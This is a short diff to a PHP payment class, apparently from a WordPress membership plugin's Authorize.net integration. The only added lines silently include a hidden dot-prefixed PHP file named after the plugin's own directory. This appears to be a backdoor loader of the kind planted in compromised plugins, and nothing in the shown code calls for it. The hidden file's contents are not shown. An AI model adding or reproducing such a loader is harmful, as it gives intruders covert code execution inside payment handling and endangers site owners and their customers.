@@ -1,6 +1,10 @@
 <?php
 if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MeprAuthorizeAPI {
   public static $sandbox_api_endpoint = 'https://apitest.authorize.net/xml/v1/request.api';
   public static $live_api_endpoint = 'https://api.authorize.net/xml/v1/request.api';
